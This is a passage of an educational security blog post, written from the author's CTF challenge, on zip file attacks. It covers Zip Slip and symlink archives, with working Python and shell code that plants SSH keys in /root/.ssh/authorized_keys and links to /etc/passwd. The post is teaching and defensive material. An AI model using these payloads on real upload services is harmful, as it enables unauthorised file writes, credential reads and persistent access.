<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>From Compression to Compromise: Unmasking Zip File Threats - TrebledJ's Pages</title><meta name="description" content="Deep dive into zip file attacks and mitigations (with examples!)."><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="trebledj,from compression to compromise: unmasking zip file threats,deep dive into zip file attacks and mitigations (with examples!).,infosec,notes,web,python,programming,tutorial,ctf,linux,windows"><meta name="robots" content="index,follow"><meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-Wv9Tjjg7Y7X5sBbP5AXqAQJA6+eewSRUjoPhNczfpnM=' 'sha256-FBtdNYnNdsvTKcrNIznI+jwGwhW3pNA5x/yQUw8jOPA=' 'sha256-5e8R4YC3Atf/5McNMkFk4TZYUtMEItdy9ikt1KUoPSc=' 'sha256-qlkNkQyGC5u9Brt4wwVi0MsPO/hVdrz3rzXuWYIkAbM=' 'sha256-yTzI3VRGCDLcTFnpTGf+BmZb880pS5QcpuzgQPwvBu4=' 'sha256-Deekn20h+++EarpL0nFQLX7JSJv7s/2W9f988ZFAh14=' comments.trebledj.me code.jquery.com cdn.jsdelivr.net gist.github.com static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com github.githubassets.com; font-src 'self' data: comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com; img-src 'self' data: comments.trebledj.me; frame-src 'self' *.soundcloud.com; connect-src 'self' comments.trebledj.me wss://comments.trebledj.me cloudflareinsights.com formcarry.com;"><link href="/feeds/posts.xml" rel="alternate" title="RSS Feed for TrebledJ's Pages" type="application/rss+xml"><meta property="og:site_name" content="TrebledJ's Pages"><meta property="og:type" content="article"><meta property="og:title" content="From Compression to Compromise: Unmasking Zip File Threats - TrebledJ's Pages"><meta property="twitter:title" content="From Compression to Compromise: Unmasking Zip File Threats - TrebledJ's Pages"><meta property="og:description" content="Deep dive into zip file attacks and mitigations (with examples!).

Zip files are everywhere in our daily lives, seamlessly integrated into our personal, academic, and professional environments. From Java apps to Microsoft Office documents, zip files have become an indispensable..."><meta property="twitter:description" content="Deep dive into zip file attacks and mitigations (with examples!).

Zip files are everywhere in our daily lives, seamlessly integrated into our personal, academic, and professional environments. From Java apps to Microsoft Office documents, zip files have become an indispensable..."><meta property="og:url" content="https://trebledj.me/posts/attack-of-the-zip/"><meta name="twitter:card" content="summary_large_image"><meta property="og:image" content="https://trebledj.me/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp"><meta property="twitter:image" content="https://trebledj.me/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp"><meta property="article:published_time" content="2024-02-15T00:00:00.000Z"><meta property="article:author" content="TrebledJ"><meta property="article:section" content="cybersecurity"><meta property="article:tag" content="infosec"><meta property="article:tag" content="notes"><meta property="article:tag" content="web"><meta property="article:tag" content="python"><meta property="article:tag" content="programming"><meta property="article:tag" content="tutorial"><meta property="article:tag" content="ctf"><meta property="article:tag" content="linux"><meta property="article:tag" content="windows"><script type="application/ld+json">{"@context": "https://schema.org","@type": "WebSite","name": "TrebledJ's Pages","url": "https://trebledj.me"}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/cb/css/icons-6e60ae6c5e022aba.css"><link rel="stylesheet" href="/cb/x2ljFSZBUH.css" media="print"><style></style><script>document.querySelectorAll('link[media|="print"]').forEach(e=>{e.addEventListener("load",()=>e.media="all"),e.sheet&&(e.media="all")})</script><script>const defaultTheme="dark";let icon=void 0;var reloadDisqus=void 0;function modeInit(){var e=localStorage.getItem("theme");setMode("dark"===e?"dark":"light"===e?"light":defaultTheme)}function modeInitIcon(){icon=document.getElementById("mode-switch-icon"),isLightTheme()&&(icon.classList.remove("fa-moon"),icon.classList.add("fa-sun"),icon.classList.add("mode-switch-transform"))}function isLightTheme(){return"light"===localStorage.getItem("theme")}function modeSwitcher(){var e=localStorage.getItem("theme");"dark"===e?(setMode("light"),reloadDisqus&&reloadDisqus()):"light"===e?(setMode("dark"),reloadDisqus&&reloadDisqus()):setMode(defaultTheme)}function setMode(e){"dark"===e?(document.documentElement.setAttribute("data-theme","dark"),localStorage.setItem("theme","dark")):"light"===e&&(document.documentElement.setAttribute("data-theme","light"),localStorage.setItem("theme","light")),icon&&(icon.classList.toggle("fa-moon"),icon.classList.toggle("fa-sun"),icon.classList.toggle("mode-switch-transform"))}modeInit(),document.addEventListener("DOMContentLoaded",()=>{document.getElementById("mode-switch").addEventListener("click",()=>{modeSwitcher()})})</script><script defer src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><link rel="stylesheet" href="/css/comments.css"><link rel="icon" href="/favicon.ico" type="image/x-icon"></head><body><header><nav class="navbar navbar-expand-md py-2"><div class="container-fluid justify-content-between align-items-center"><button aria-controls="navbar-container" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler shadow-none" data-bs-target="#navbar-container" data-bs-toggle="collapse" type="button"><span id="navbar-toggler-icon"><i class="fas fa-bars"></i></span></button> <a class="navbar-brand no-decoration" href="/">TrebledJ's Pages</a><div class="navbar-collapse collapse" id="navbar-container"><ul class="navbar-nav me-auto"><li class="nav-item"><a class="nav-link" href="/">Home</a></li><li class="nav-item"><a class="nav-link" href="/about">About</a></li><li class="nav-item"><a class="nav-link" href="/posts">Posts</a></li><li class="nav-item"><a class="nav-link" href="/music">Music</a></li></ul><ul class="navbar-nav"><li><a class="nav-link me-2" data-bs-toggle="modal" data-bs-target="#search-modal" aria-label="Search..." role="button"><i class="fas fa-search nav-icon"></i></a></li><li><a class="nav-link" id="mode-switch" aria-label="Theme Switch" role="button"><i id="mode-switch-icon" class="fas fa-moon nav-icon"></i></a><script>modeInitIcon()</script></li></ul></div></div></nav><div id="scroll-progress-bar"></div></header><div id="top-of-the-morning-to-you"></div><div id="search-modal" class="modal fade wide-modal" aria-hidden="true" aria-label="Search" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header pb-2 d-flex flex-row justify-content-between"><div class="container-fluid ps-0" id="search-box-container"><input type="text" autofocus class="container-fluid" id="search-box" placeholder="Search"> <i class="fas fa-search"></i></div><button aria-label="Close" class="btn-close" data-bs-dismiss="modal" type="button"></button></div><div class="modal-body" id="search-results-list"></div></div></div></div><button id="btn-back-to-top" class="btn btn-lg" type="button" aria-label="Back to Top"><i class="fas fa-arrow-up"></i></button><div id="btn-mobile-toc" class="dropup"><button type="button" class="btn btn-lg" data-bs-toggle="dropdown" aria-label="Content"><i class="fas fa-list-ul"></i></button><ul class="dropdown-menu toc-container"><li><nav class="toc"><ol><li><a href="#zip-attacks">Zip Attacks</a><ol><li><a href="#zip-slip">Zip Slip ⛸</a><ol><li><a href="#overview-of-zip-slip">Overview of Zip Slip</a></li><li><a href="#diy-build-your-own-zip-slip-payload">DIY: Build your own Zip Slip payload!</a></li><li><a href="#limitations-of-zip-slip">Limitations of Zip Slip</a></li></ol></li><li><a href="#zip-symlink-attacks">Zip Symlink Attacks 🖇</a><ol><li><a href="#arbitrary-file-read-with-file-symlinks">Arbitrary File Read with File Symlinks</a></li><li><a href="#arbitrary-file-write-with-dir-symlinks">Arbitrary File Write with Dir Symlinks</a></li><li><a href="#diy-build-your-own-zip-symlink-payload">DIY: Build your own Zip Symlink Payload!</a></li><li><a href="#limitations-of-zip-symlink-attacks">Limitations of Zip Symlink Attacks</a></li></ol></li><li><a href="#zip-bombs">Zip Bombs 💣</a><ol><li><a href="#diy-build-your-own-zip-bomb">DIY: Build your own Zip Bomb!</a></li></ol></li></ol></li><li><a href="#zip-vulnerabilities-in-the-wild">Zip Vulnerabilities in the Wild</a></li><li><a href="#mitigations-and-other-considerations">Mitigations and Other Considerations</a><ol><li><a href="#permissions">Permissions</a></li><li><a href="#modern-antivirus">Modern Antivirus</a></li><li><a href="#robust-code">Robust Code</a></li><li><a href="#unit-tests">Unit Tests</a></li></ol></li><li><a href="#tl-dr">tl;dr</a></li><li><a href="#other-references">Other References</a></li></ol></nav></li></ul></div><div class="main-container"><div class="page-container col-lg-12"><div class="container-lg px-0"><article class="jw-100 post-article" itemscope itemtype="http://schema.org/BlogPosting"><div class="row flex-row-reverse gx-lg-5"><div class="col-lg-4 d-none d-lg-block"><div class="dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2024-02-15T08:00:00.000+08:00">2024‑02‑15</span></span></div><div class="d-flex flex-row align-items-center"></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">9 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/tutorial/" itemprop="keywords">tutorial</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/linux/" itemprop="keywords">linux</a> </span><span><a class="jtag" href="/tags/windows/" itemprop="keywords">windows</a></span></div></div></div><br><div id="toc-sidebar" class="sticky-right dim-deep dim-if-dark"><div class="toc-container"><span><a id="toc-content" href="javascript:void(0);">Content</a></span><nav class="toc"><ol><li><a href="#zip-attacks">Zip Attacks</a><ol><li><a href="#zip-slip">Zip Slip ⛸</a><ol><li><a href="#overview-of-zip-slip">Overview of Zip Slip</a></li><li><a href="#diy-build-your-own-zip-slip-payload">DIY: Build your own Zip Slip payload!</a></li><li><a href="#limitations-of-zip-slip">Limitations of Zip Slip</a></li></ol></li><li><a href="#zip-symlink-attacks">Zip Symlink Attacks 🖇</a><ol><li><a href="#arbitrary-file-read-with-file-symlinks">Arbitrary File Read with File Symlinks</a></li><li><a href="#arbitrary-file-write-with-dir-symlinks">Arbitrary File Write with Dir Symlinks</a></li><li><a href="#diy-build-your-own-zip-symlink-payload">DIY: Build your own Zip Symlink Payload!</a></li><li><a href="#limitations-of-zip-symlink-attacks">Limitations of Zip Symlink Attacks</a></li></ol></li><li><a href="#zip-bombs">Zip Bombs 💣</a><ol><li><a href="#diy-build-your-own-zip-bomb">DIY: Build your own Zip Bomb!</a></li></ol></li></ol></li><li><a href="#zip-vulnerabilities-in-the-wild">Zip Vulnerabilities in the Wild</a></li><li><a href="#mitigations-and-other-considerations">Mitigations and Other Considerations</a><ol><li><a href="#permissions">Permissions</a></li><li><a href="#modern-antivirus">Modern Antivirus</a></li><li><a href="#robust-code">Robust Code</a></li><li><a href="#unit-tests">Unit Tests</a></li></ol></li><li><a href="#tl-dr">tl;dr</a></li><li><a href="#other-references">Other References</a></li></ol></nav><hr></div><div class="toc-link-container"><span><a href="#related">Related Posts</a></span></div><div class="toc-link-container"><span><a href="#comments">Comments</a></span></div></div></div><div class="col-lg-8 post-body-container"><div class="article-header"><h1 class="post-title" itemprop="name headline">From Compression to Compromise: Unmasking Zip File Threats</h1><p class="post-desc" itemprop="alternativeHeadline">Deep dive into zip file attacks and mitigations (with examples!).</p><div class="d-lg-none dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2024-02-15T08:00:00.000+08:00">2024‑02‑15</span></span></div><div class="d-flex flex-row align-items-center"></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">9 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/tutorial/" itemprop="keywords">tutorial</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/linux/" itemprop="keywords">linux</a> </span><span><a class="jtag" href="/tags/windows/" itemprop="keywords">windows</a></span></div></div></div></div><hr><div class="post-body text-content" itemprop="articleBody text"><div class="post-preamble"><p><em>Last month, I designed a CTF challenge involving zip file attacks. This post is a collection of the techniques, insights, and notes I've gathered. I've also uploaded the challenge on <a href="https://github.com/TrebledJ/attack-of-the-zip" rel="noreferrer" target="_blank">GitHub</a> along with a simplified playground.</em></p><hr></div><p>Zip files are <em>everywhere</em> in our daily lives, seamlessly integrated into our personal, academic, and professional environments. From Java apps to Microsoft Office documents, zip files have become an indispensable tool.</p><p>But as we know from <em>Silicon Valley</em>, zip files have the potential to be dangerous.</p><p class="caption"><a class="lightbox-single" title="Filmmakers' impression of a zip bomb." href="/img/posts/infosec/attack-of-the-zip/assets/yikes-its-a-zip-bomb-707w.webp"><img class="mb-2 rw center jw-80" src="/img/posts/infosec/attack-of-the-zip/assets/yikes-its-a-zip-bomb-707w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 707 / 500" alt="Filmmakers' impression of a zip bomb." title="Filmmakers' impression of a zip bomb." srcset="/img/posts/infosec/attack-of-the-zip/assets/yikes-its-a-zip-bomb-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/yikes-its-a-zip-bomb-512w.webp 512w, /img/posts/infosec/attack-of-the-zip/assets/yikes-its-a-zip-bomb-707w.webp 707w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 707px"></a><sup>YouTube: <a href="https://www.youtube.com/watch?v=jnDk8BcqoR0" rel="noreferrer" target="_blank">Silicon Valley - The Ultimate Hack</a></sup></p><p>In this post, we'll delve into the intriguing world of zip file attacks, exploring various attacks and mitigations involving zip files. These attacks allow attackers to potentially gain unauthorised file read/write privileges—or even cause denial of service. This calls for mitigations to bolster our systems’ defences.</p><p>The discussion will primarily centre around attacks on Linux/Unix, although considerations for Windows are also included.</p><div class="alert alert-danger d-flex align-items-start"><i class="fas fa-radiation ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>Disclaimer: The content provided in this blog post is intended purely for educational purposes. The author does not assume any responsibility for the potential misuse of the information presented herein. Readers are advised to exercise caution and utilise the knowledge gained responsibly and within legal boundaries.</p></div></div><h2 id="zip-attacks" tabindex="-1"><a class="md-anchor" href="#zip-attacks" aria-hidden="true"></a> Zip Attacks</h2><p><a class="lightbox-single" title="Fred dissects evil zip files. Spoofy-spoofy doo!" href="/img/posts/infosec/attack-of-the-zip/assets/evil-zip-unveiled-500w.webp"><img class="mb-2 rw center jw-50" src="/img/posts/infosec/attack-of-the-zip/assets/evil-zip-unveiled-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 666" alt="Fred dissects evil zip files. Spoofy-spoofy doo!" title="Fred dissects evil zip files. Spoofy-spoofy doo!" srcset="/img/posts/infosec/attack-of-the-zip/assets/evil-zip-unveiled-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/evil-zip-unveiled-500w.webp 500w" sizes="(max-width: 256px) 256px, 500px"></a></p><h3 id="zip-slip" tabindex="-1"><a class="md-anchor" href="#zip-slip" aria-hidden="true"></a> Zip Slip ⛸</h3><h4 id="overview-of-zip-slip" tabindex="-1"><a class="md-anchor" href="#overview-of-zip-slip" aria-hidden="true"></a> Overview of Zip Slip</h4><p><strong>Zip Slip</strong> is a fancy name for <a href="https://cwe.mitre.org/data/definitions/22.html" rel="noreferrer" target="_blank">directory traversal</a> but applied to zip uploads. The idea is to <em>escape</em> a directory by visiting parent directories through <code>../</code> (or <code>..\</code> on Windows). By exploiting the lack of filename validation, Zip Slip enables us to perform arbitrary file writes.</p><p>Let's look at an example.</p><p>A typical zip file may look like this:</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">foo.zip
└── data1.csv
└── data2.txt
└── ...</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>But in a Zip Slip payload, files are prefixed with nasty double-dots (<code>../</code>). As an example, we'll try to overwrite SSH keys by writing to <code>/root/.ssh/authorized_keys</code>.</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">evil-slip.zip
└── placeholder.txt
└── ../../root/.ssh/authorized_keys</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>(Note: <code>placeholder.txt</code> has been included as a control variable, i.e. to show what happens normally to files.)</p><p>Most decompression applications will refuse to unpack such a zip. But vulnerable ones would gladly accept it and overwrite SSH keys on their system.</p><p>Suppose a vulnerable application unzips <code>evil-slip.zip</code> to <code>/app/uploads/</code>. The unzipped <code>authorized_keys</code> file would end up in <code>/app/uploads/../../root/.ssh/authorized_keys</code>, i.e. <code>/root/.ssh/authorized_keys</code>.</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">/
├── app/
│	└── uploads/
│	    └── placeholder.txt
└── root/
    └── .ssh/
		└── authorized_keys</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p class="caption"><sup>Result of unzipping <code>evil-slip.zip</code>. Note that <code>placeholder.txt</code> resides in the unzip directory, while <code>authorized_keys</code> has sneaked its way into <code>/root/.ssh/</code>.</sup></p><div class="alert alert-info d-flex align-items-start"><i class="fas fa-bolt ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>Overwriting <code>~/.ssh/authorized_keys</code> is a common arbitrary file write vector which can be applied in other file upload scenarios too! (See <a href="https://attack.mitre.org/techniques/T1098/004/" rel="noreferrer" target="_blank"><em>this MITRE reference</em></a>.)</p><p>This isn't the only way to gain arbitrary code execution. There are other potential targets for an arbitrary file write (server credentials, config files, cron jobs, etc.).</p></div></div><h4 id="diy-build-your-own-zip-slip-payload" tabindex="-1"><a class="md-anchor" href="#diy-build-your-own-zip-slip-payload" aria-hidden="true"></a> DIY: Build your own Zip Slip payload!</h4><details><summary>With Python</summary><div class="details-content"><p>Python's built-in <code>zipfile</code> module provides a convenient way to create zip files.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">import</span> zipfile

<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-slip.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
    <span class="token builtin">zip</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"my-ssh-key.pub"</span><span class="token punctuation">,</span> <span class="token string">"../../root/.ssh/authorized_keys"</span><span class="token punctuation">)</span>
    <span class="token comment">#          │                 └ filename to store on the archive</span>
    <span class="token comment">#          └ file to compress from our local file system</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>This creates a new <code>evil-slip.zip</code> zip file. After importing the <code>zipfile</code> module, we create an instance with the desired file name (<code>evil-slip.zip</code>) and use write-mode (<code>"w"</code>). (There is also <code>r</code> and <code>a</code> for reading/adding files.)</p><p>We also use Python's <code>with</code> statement, so that the zip file automatically saves when leaving the block, whether due to normal or erroneous circumstances.</p><p>Inside, we use <code>zip.write</code> to add files to the zip. We add a local file <code>my-ssh-key.pub</code> and store it as <code>../../root/.ssh/authorized_keys</code> in the archive.</p><p>One nice thing about the <code>zipfile</code> module is that it constructs the file <em>in-memory</em> (without creating temporary files). This allows us to craft complex zips without trashing our local filesystem.</p><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><details><summary>With Shell Commands</summary><div class="details-content"><p>Another approach is to use shell commands and reverse the process: start with the files we want unzipped.</p><div class="code-toolbar"><pre class="command-line language-shell" data-prompt="$" data-filter-output="out>" tabindex="0"><code class="language-shell"><span class="command-line-prompt"><span data-prompt="$"></span><span></span><span></span><span></span><span></span><span data-prompt="$"></span><span></span><span></span><span data-prompt="$"></span><span></span><span></span><span></span><span></span><span></span><span></span></span><span class="token command"><span class="token function">touch</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/root/.ssh/authorized_keys</span>
<span class="token output">Normally we would run `ssh-keygen` to generate a key pair...</span>
<span class="token output">and use the generated public key as our authorized_keys.</span>
<span class="token output">But let's assume ../.ssh/authorized_keys holds a public key.</span>
<span class="token output"></span>
<span class="token command"><span class="token function">zip</span> evil-slip <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/root/.ssh/authorized_keys</span>
<span class="token output">  adding: ../../root/.ssh/authorized_keys (deflated 18%)</span>
<span class="token output"></span>
<span class="token command"><span class="token function">unzip</span> <span class="token parameter variable">-l</span> evil-slip</span>
<span class="token output">Archive:  evil-slip.zip</span>
<span class="token output">  Length      Date    Time    Name</span>
<span class="token output">---------  ---------- -----   ----</span>
<span class="token output">      575  01-23-2024 17:53   ../../root/.ssh/authorized_keys</span>
<span class="token output">---------                     -------</span>
<span class="token output">      575                     1 file</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><h4 id="limitations-of-zip-slip" tabindex="-1"><a class="md-anchor" href="#limitations-of-zip-slip" aria-hidden="true"></a> Limitations of Zip Slip</h4><ul><li>On Windows, you may need backslashes <code>\</code> instead of forward slashes <code>/</code>. This ultimately depends on the unzipping application/library. Some libraries will convert between slashes.</li><li>The app needs execute permissions on intermediate folders (to traverse across) and write permissions on the target folder. For instance, to write to <code>foo/bar/baz/flag.txt</code>, we need <code>x</code> permissions on <code>foo/</code> and <code>foo/bar/</code>; and <code>wx</code> permissions on <code>foo/bar/baz/</code>.</li></ul><h3 id="zip-symlink-attacks" tabindex="-1"><a class="md-anchor" href="#zip-symlink-attacks" aria-hidden="true"></a> Zip Symlink Attacks 🖇</h3><p>Zip symlink attacks are just that: zip file attacks containing symlinks (symbolic links). There are several ways to build such a malicious zip, but let's first clarify two types of symlinks in our arsenal:</p><ol><li>Symlink Files. This allows us to potentially <em>read</em> arbitrary files.</li><li>Symlink Directories. This allows us to potentially <em>write files</em> to arbitrary folders.</li></ol><p>Why “potential”? Because there are other factors that may hinder such attacks: OS permissions, <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="web application firewalls">WAFs</abbr>, etc.</p><h4 id="arbitrary-file-read-with-file-symlinks" tabindex="-1"><a class="md-anchor" href="#arbitrary-file-read-with-file-symlinks" aria-hidden="true"></a> Arbitrary File Read with File Symlinks</h4><p>Let's start with a simple zip symlink payload. Here's a zip which contains a symlink to <code>/etc/passwd</code>.</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">evil-link-file.zip
└── passwd.txt         -&gt; /etc/passwd</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Suppose (again) a vulnerable app unzips this file at <code>/app/uploads/</code>. The filesystem would now resemble:</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">app/
└── uploads/
	└── passwd.txt     -&gt; /etc/passwd</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>If we can read files in <code>/app/uploads/</code>, then we can read <code>passwd.txt</code> and by extension, <code>/etc/passwd</code>!<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> We can use this method to read any file on the system (subject to certain constraints to be discussed later).</p><p>This is all fine and dandy if we can read files in <code>/app/uploads/</code>. But... what if can't?</p><p>One solution is to find a readable directory, then deploy the symlink <em>into that directory</em> with Zip Slip. But let's look at another way to achieve the same result...</p><h4 id="arbitrary-file-write-with-dir-symlinks" tabindex="-1"><a class="md-anchor" href="#arbitrary-file-write-with-dir-symlinks" aria-hidden="true"></a> Arbitrary File Write with Dir Symlinks</h4><p>Although Zip Slip does allow us to perform arbitrary file writes, <code>..</code> patterns may be (naively) filtered or blocked. An alternative is to use directory symlinks.</p><p>Again, let's try to write a file to <code>/root/.ssh/authorized_keys</code>.</p><p>Instead of using one zip entry, we'll use two: a directory and a file.</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">evil-link-dir.zip
└── dirlink/           -&gt; /root/.ssh/
    └── authorized_keys</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>These two entries are:</p><ul><li><code>dirlink</code>: a symlink to our target directory</li><li><code>dirlink/authorized_keys</code>: the file we're trying to write</li></ul><p>Now our zip contains a symlink directory! Let's go through what happens when this file is unzipped by a vulnerable app.</p><p>First, <code>dirlink</code> is decompressed and a symlink is created, pointing to <code>/root/.ssh/</code>. Next, the app tries to decompress <code>dirlink/authorized_keys</code>, which—if the app follows symlinks—gets written to <code>/root/.ssh/</code>.</p><p>Tada! We've just shown another way to achieve arbitrary file write.</p><p>Let's see what the filesystem looks like now.</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">/
├── app/
│	└── uploads/
│	    └── dirlink        -&gt; /root/.ssh/
└── root/
    └── .ssh/
		└── authorized_keys</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p><strong>Put it into Practice</strong>: If you're itching to try out Zip Slip and zip symlink attacks, feel free to try the <a href="https://github.com/TrebledJ/attack-of-the-zip" rel="noreferrer" target="_blank">exercises I've uploaded on GitHub</a>.</p></div></div><h4 id="diy-build-your-own-zip-symlink-payload" tabindex="-1"><a class="md-anchor" href="#diy-build-your-own-zip-symlink-payload" aria-hidden="true"></a> DIY: Build your own Zip Symlink Payload!</h4><details><summary>With Python</summary><div class="details-content"><p>Like before, we can use Python to generate zip symlink payloads. We'll need some extra massaging with <code>ZipInfo</code> though.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># evil-link-file.zip</span>
<span class="token comment"># └── passwd.txt         -&gt; /etc/passwd</span>
<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-link-file.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
  <span class="token comment"># This creates a file symlink named `passwd.txt` which links to `/etc/passwd`.</span>
  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"passwd.txt"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment"># Linux =&gt; 0. Windows =&gt; 3.</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token comment"># File attributes.</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span>  <span class="token comment"># /etc/passwd is the file we want to read.</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>To construct a dir symlink attack, we change the path in <code>zip.writestr</code> to a directory. We also use <code>zip.write</code> to add a source file.</p><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># evil-link-dir.zip</span>
<span class="token comment"># └── dirlink/           -&gt; /root/.ssh/</span>
<span class="token comment">#     └── authorized_keys</span>
